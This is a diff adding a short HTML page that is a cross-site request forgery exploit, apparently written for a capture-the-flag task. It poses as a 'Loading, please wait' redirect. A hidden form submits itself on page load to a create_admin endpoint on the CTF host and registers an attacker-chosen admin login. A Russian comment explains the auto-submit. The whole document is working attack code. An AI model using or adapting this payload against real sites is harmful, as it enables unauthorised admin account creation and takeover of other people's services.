@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>You are being redirected...</title>
+</head>
+<body>
+    <p>Loading, please wait...</p>
+
+    <form id="exploitForm" action="http://tasks.goidactf.ru:20121/create_admin" method="POST">
+        <input type="hidden" name="new_admin_login" value="my_hacker_login">
+    </form>
+
+    <script>
+        // Как только страница загрузится, форма отправится автоматически
+        window.onload = function() {
+            document.getElementById('exploitForm').submit();
+        };
+    </script>
+</body>
+</html>
